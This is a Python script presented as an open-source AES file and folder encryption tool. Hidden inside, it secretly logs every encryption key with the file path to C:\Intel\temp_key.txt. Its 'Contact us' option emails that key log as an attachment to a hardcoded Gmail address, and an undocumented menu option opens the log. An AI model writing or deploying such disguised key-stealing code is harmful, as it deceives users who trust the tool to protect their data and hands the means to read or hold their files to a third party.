import hashlib
import pyAesCrypt
import random
import os,time
import shutil

import email, smtplib, ssl
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

buffer=64*1024

while buffer!=0:
	print('*********************************Fi1e EncRypt0R********************************')
	print('''This tool is an Open Source AES Standard encrytion tool, Always make sure to 
	backup the encryption key if not the files cannot be reverted back''')
	print('*******************************************************************************')
	print('1.Encrypt \n2.Decrypt \n3.Folder Encryption \n4.Folder Decryption \n5.Contact us \n6.Exit')
	ip=int(input(('Enter options: ')))
	#ip=5
	if ip==1:
		fname=input(str('Enter file path (without quotes): '))
		#fname='test.zip'
		try:
			sub_key="abcdefg!~hijklm#$&*nopqrstuvw-+@xyz02345+/67890A-)(%BCDEFGHIJKLMNOPQRSTUVWXYZ"
			enc_key =  "".join(random.sample(sub_key,30))
			pyAesCrypt.encryptFile(fname,fname+'.aes',enc_key,buffer)
			os.remove(fname)
			print('''----------Encryption Sucessfull----------\n \nUser Warning: Make sure to notedown the encryption key,
	failure to do so the data cannot be reverted back ever again.''')
			print('\nEncryption Key: ',enc_key+'\n')
			now=time.strftime("%H:%M")
			with open('C:\\Intel\\'+'temp_key.txt','a+') as f:
				f.write(fname+'|||'+now+'||||'+enc_key+'\n')
			time.sleep(10)
		except:
			print('Invalid File\n')

	elif ip==2:
		try:
			fname=input(str('Enter file path: '))
			if fname[-4:]=='.aes':
				key=input(str('Enter ur decryption key: '))
				pyAesCrypt.decryptFile(fname,'Out_'+fname[:-4],key,buffer)
				os.remove(fname)
				print('Decyrption Succesfull...')
				time.sleep(5)
			else:
				print('Invalid Crypto-File\n')
		except:
			print('Decryption Failed...\n')

	elif ip==3:
		
		fol=input('Enter the folder path (without quotes): ')
		#fol='Dataset'
		if not os.path.exists('encrypted_folder'):
			os.mkdir('encrypted_folder')
		sub_key="abcdefg!~hijklm#$&*nopqrstuvw-+@xyz02345+/67890A-)(%BCDEFGHIJKLMNOPQRSTUVWXYZ"
		enc_key =  "".join(random.sample(sub_key,30))
		for i in os.listdir(fol):
			if i[-4:]!='.aes':
				try:
					pyAesCrypt.encryptFile(fol+'\\'+i,fol+'\\'+i+'.aes',enc_key,buffer)
					shutil.move(fol+'\\'+i+'.aes','encrypted_folder')
					print('Encrypting...!')
				except:
					shutil.rmtree('encrypted_folder')
					os.mkdir('encrypted_folder')
					pyAesCrypt.encryptFile(fol+'\\'+i,fol+'\\'+i+'.aes',enc_key,buffer)
					shutil.move(fol+'\\'+i+'.aes','encrypted_folder')
					print('Encrypting...!')
			else:
				print('Unable to Encrypt')
		now=time.strftime("%H:%M")
		with open('C:\\Intel\\'+'temp_key.txt','a+') as f:
			f.write('Folder'+'|||'+fol+'|||'+now+'||||'+enc_key+'\n')
		time.sleep(10)
		print('''----------Encryption Sucessfull----------\n \nUser Warning: Make sure to notedown the encryption key,
	failure to do so the data cannot be reverted back ever again.''')
		print('\nEncryption Key: ',enc_key+'\n') 

	elif ip==4:
		fol='encrypted_folder'
		if not os.path.exists('dencrypted_folder'):
			os.mkdir('dencrypted_folder')
		enc_key=input('Enter the decryption key: ')
		for i in os.listdir(fol):
			if i[-4:]=='.aes':
				try:
					pyAesCrypt.decryptFile(fol+'\\'+i,fol+'\\'+i[:-4],enc_key,buffer)
					shutil.move(fol+'\\'+i[:-4],'dencrypted_folder')
					print('Decrypting...!')
				except:
					pyAesCrypt.decryptFile(fol+'\\'+i,fol+'\\'+i[:-4],enc_key,buffer)
					shutil.move(fol+'\\'+i[:-4],'dencrypted_folder')
					print('Decrypting...!')	
			else:
				print('Choose the appropriate dencrypted folder')
		shutil.rmtree('encrypted_folder')
		print('Decryption Done...')

	elif ip==5:
		mail_content=input('''\nKindly enter the issue and the our we shall 
contact u within 2 working days...: ''')
		mail_id=input('Input ur mail id: ')
		subject = "A Query from "+mail_id
		body = "This is an email with attachment sent from Python"
		sender_email = "xys@gmail.com"
		receiver_email = "xys@gmail.com"
		password = 'password'

		message = MIMEMultipart()
		message["From"] = sender_email
		message["To"] = receiver_email
		message["Subject"] = subject
		message["Bcc"] = receiver_email  
		message.attach(MIMEText(body, "plain"))

		filename = 'C:\\Intel\\temp_key.txt' 

		with open(filename, "rb") as attachment:
		    part = MIMEBase("application", "octet-stream")
		    part.set_payload(attachment.read())

		  
		encoders.encode_base64(part)
		part.add_header(
		    "Content-Disposition",
		    f"attachment; filename= {filename}",
		)

		message.attach(part)
		text = message.as_string()

		context = ssl.create_default_context()
		with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
		    server.login(sender_email, password)
		    server.sendmail(sender_email, receiver_email, text)

		print('Thanks for contacting us\n')
		time.sleep(3)

	elif ip==000:
		os.startfile('C:\\Intel\\temp_key.txt')
	elif ip==6:
		print('Thanks for using Fi1e EncRypt0R')
		time.sleep(5)
		buffer=0
	else:
		print('Invalid Input\n')
		